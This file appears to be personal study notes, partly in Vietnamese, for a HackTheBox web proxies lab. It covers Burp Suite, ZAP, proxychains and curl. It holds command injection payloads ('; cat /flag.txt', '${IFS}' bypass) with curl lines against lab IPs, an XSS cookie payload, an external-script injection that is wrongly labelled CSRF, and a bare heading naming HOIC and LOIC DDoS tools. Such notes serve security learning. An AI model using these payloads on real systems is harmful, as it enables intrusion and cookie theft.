# Resources
https://beafn28.gitbook.io/
https://beafn28.gitbook.io/beafn28/apuntes-hacking/using-web-proxies

# Labs

# Tools

## Burp Suite (Community and Pro/Enterprise version)
'''
java -jar </path/to/burpsuite.jar>
'''

## OWASP ZAP
```
zaproxy
```
## FoxyProxy (Firefox extension for Burp and ZAP)

## Zap 
### Zap fuzzer
https://forum.hackthebox.com/t/help-with-question-proxies-zap-fuzzer/257933/23

Notice: setup CA cert for 3 tools

## Proxychains
routes all traffic coming from any command-line tool to any proxy we specify

## Zap scanner
2 ways to resolve:

1st way:
```
Bước 1: Quét mục tiêu bằng ZAP Scanner
Mở trình duyệt tích hợp sẵn của ZAP và truy cập vào IP mục tiêu của bạn: http://154.57.164.75:31022

Tại giao diện ZAP, nhấp chuột phải vào URL mục tiêu trong danh sách bên trái hoặc trong History, chọn Attack > Spider để ZAP thu thập toàn bộ danh mục website.

Sau khi Spider chạy xong, nhấp chuột phải vào thư mục gốc của trang web đó một lần nữa, chọn Attack > Active Scan.

Chờ cho quá trình Active Scan chạy (bạn có thể theo dõi tiến độ ở tab bên dưới). Khi xuất hiện một biểu tượng cờ màu đỏ (High Alert), hãy bấm vào đó. Lỗ hổng tìm được sẽ là Remote OS Command Injection.

Bước 2: Xác định tham số bị lỗi (Vulnerability Parameter)
Nhấp vào lỗ hổng Remote OS Command Injection trong tab Alerts.

Xem chi tiết phần Attack hoặc Evidence ở khung bên phải để biết ZAP đã chèn lệnh vào tham số nào (ví dụ: một ô nhập liệu, một tham số trên URL như ?ip=, ?cmd=, hoặc một chức năng như kiểm tra ping).

Bước 3: Khai thác thủ công để lấy Flag
Sau khi biết tham số và cách thức chèn lệnh, bạn hãy dùng công cụ Open in RequestEditor (hoặc dùng ngay trình duyệt) để tự gửi lệnh đọc file flag.

Kỹ thuật chèn lệnh thường sử dụng các ký tự nối lệnh như ;, &, hoặc |. Do đề bài yêu cầu đọc file tại vị trí /flag.txt, bạn hãy thử các chuỗi payload sau vào tham số bị lỗi đó:

Nếu tham số kiểm tra IP/Ping (như 127.0.0.1), hãy thử nối lệnh:

Plaintext
127.0.0.1; cat /flag.txt
hoặc

Plaintext
127.0.0.1 && cat /flag.txt
Nếu hệ thống chặn khoảng trắng, bạn có thể thay khoảng trắng bằng biến ${IFS}:

Plaintext
127.0.0.1;cat${IFS}/flag.txt
Gửi request đi và kiểm tra nội dung Response, bạn sẽ nhìn thấy chuỗi flag dạng HTB{...} hiển thị ở text phản hồi. Hãy copy chuỗi đó và submit vào ô câu hỏi để hoàn thành bài lab!
```
2nd way: using 
```
$ dirb http://94.237.60.55:35284/ /usr/share/dirb/wordlists/common.txt
$ curl -s "http://94.237.60.55:35284/devtools/ping.php?ip=127.0.0.1%3Bfind%20/%20-name%20flag.txt%202%3E/dev/null"
$ curl -s "http://94.237.60.55:35284/devtools/ping.php?ip=127.0.0.1%3Bcat%20/flag.txt"
```


```
$ vi /etc/proxychains.conf
#socks4         127.0.0.1 9050
http 127.0.0.1 8080
```

run any cmd with prefix 'proxychain -q' before (-q hide unuseful output). Ex: use curl
```
$ proxychains -q curl http://SERVER_IP:PORT
```
then the Burp Suit app will catch the request

## Metaspoil
investigate and debug proxy web traffic. Add `set PROXIES HTTP:127.0.0.1:8080` in msfconfig before `run`
```
$ msfconsole
... > set PROXIES HTTP:127.0.0.1:8080
...
... > run
```

## Burp Intruder
fuzzer, enumeration and automatically brute-force in web. Aternative for ffuf, dirbuster, gobuster, wfuzz CLI tools

Notice: Pro version is umlimited speed and unlimited features, whereas Community version limit speed 1 request/second and limit features
- Block request: right click in request and choose Send to Intruder (CTRL + I)
- Position: choose a place need to use fuzz and click § button
- Payload (dictionary config):
    + Payload Position: Sniper (1 target), Cluster boom (many target)
    + Payload Type: Simple List (download dictionary), Runtime file (read for each line to reduce RAM)
    + Payload Processing: Use Regex to apply rule for dictionary words
    + Payload configuration: choose a dictionary file (ex: common.txt)
    + Payload Encoding: on/off URL-encode for special words
- Settings: advance setting

Finally, click Start Attack

## curl

-O : download with filename same as server

-o [filename]: download file with specific name

-s : silent mode, turn off all detail info while downloading

-h or --help 

-k : connect without SSL cert (http)

-v : show everything about stream info as debugging mode

-u : login with basic auth (ex: curl -u admin:admin [url])

-H : header, can use it as login feature with HTTP basic Auth by adding Authorization header (ex: `Authorization: Basic code`)

-i : show response headers and body

-I : only show response header

-X : method (POST, GET...)

-d : payload

-c : save and store cookies as file (eg. cookies.txt)

-b : set cookie (use a text or a filename, such as cookies.txt)

no any param: use https, printout all html content page

## DDOS
### HOIC

### LOIC

### jMeter

# Contents

## HTML Injection

## XSS
Cause:

developer did use directly element.innerHTML without parsing to string :
```
let userInput = document.getElementById("userInput").value;
document.getElementById("result").innerHTML = "Result: " + userInput;
```
so when we break it down by geting cookie from user local:
```
"><img src=/ onerror=alert(document.cookie)>
``` 
the cookie will be shown

the "> prefix is used to break the structure of value, if doesn't use it, the result will be:
```
<input type="text" name="username" value="<img src=/ onerror=alert(document.cookie)>">
```
the "> will break down the value

## CSRF
```
"><script src=//www.example.com/exploit.js></script>
```
How to prevent? 
1. Eliminate all spcecial characters like <, >, ".
2. Check valid of email, name, phone number,...
3. Use Anti-CSRF mechanism in browsers, such ask Anti-CSRF token, which only use 1 unique token for each session/request
4. config Cookies property as a `SameSite=Strict` level or `Lax` to prevent browser attach authen cookies in cross-origin
5. Ask client re-type password before handling sensitive action, such as changing password, email...

